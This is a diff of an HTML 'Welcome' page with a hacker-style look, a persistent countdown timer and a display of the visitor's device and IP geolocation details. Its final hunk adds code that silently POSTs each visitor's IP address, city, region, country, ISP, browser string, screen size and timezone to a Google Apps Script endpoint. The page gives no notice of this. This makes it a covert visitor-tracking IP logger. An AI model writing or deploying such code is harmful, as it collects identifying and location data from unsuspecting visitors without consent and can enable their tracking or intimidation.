@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Welcome</title>
   <style>
     * {
@@ -11,18 +11,20 @@
     }
 
     html, body {
-      height: 100%;
+      min-height: 100%;
       background-color: #000;
       color: #0f0;
       font-family: monospace;
       display: flex;
       justify-content: center;
-      align-items: center;
+      align-items: flex-start;
+      flex-direction: column;
+      padding: 40px 20px;
     }
 
     .container {
       max-width: 800px;
-      padding: 40px;
+      width: 100%;
       text-align: center;
       line-height: 1.6;
     }
@@ -44,6 +46,15 @@
     p {
       margin: 6px 0;
     }
+
+    #footer-text {
+      margin-top: 30px;
+      text-align: center;
+      color: #0f0;
+      font-family: monospace;
+      font-size: 1rem;
+      user-select: none;
+    }
   </style>
 </head>
 <body>
@@ -55,10 +66,14 @@
       <h2>Your Device Info</h2>
       <p><strong>Loading...</strong></p>
     </div>
+
+    <footer id="footer-text">
+      This is the text just below the content.
+    </footer>
   </div>
 
   <script>
-    // --- COUNTDOWN TIMER ---
+    // COUNTDOWN
     let startTime = localStorage.getItem('countdownStart');
     if (!startTime) {
       startTime = Date.now();
@@ -86,7 +101,7 @@
     const timerInterval = setInterval(updateCountdown, 1000);
     updateCountdown();
 
-    // --- INFO SECTION ---
+    // DEVICE + IP INFO
     const info = document.getElementById('info');
     const ua = navigator.userAgent;
     const screenRes = `${window.screen.width} x ${window.screen.height}`;
@@ -101,7 +116,7 @@
       <p><strong>Cookies Enabled:</strong> ${navigator.cookieEnabled}</p>
     `;
 
-    // --- IP + GEOLOCATION ---
+    // IP + LOCATION FETCH + LOGGING
     fetch('https://ipapi.co/json/')
       .then(res => res.json())
       .then(data => {
@@ -117,6 +132,24 @@
           </div>
         `;
         info.innerHTML += geoHTML;
+
+        // Send to Google Sheet
+        fetch("https://script.google.com/macros/s/AKfycbzbsrItXPyxdoRhlr4Av0tspvVW_4MWRObFtJPlGC-KfF0IcnBw7uzhYUeB1NkH80B4og/exec", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            ip: data.ip,
+            city: data.city,
+            region: data.region,
+            country: data.country_name,
+            isp: data.org,
+            browser: ua,
+            screen: screenRes,
+            timezone: timezone
+          })
+        });
       });
   </script>
 </body>
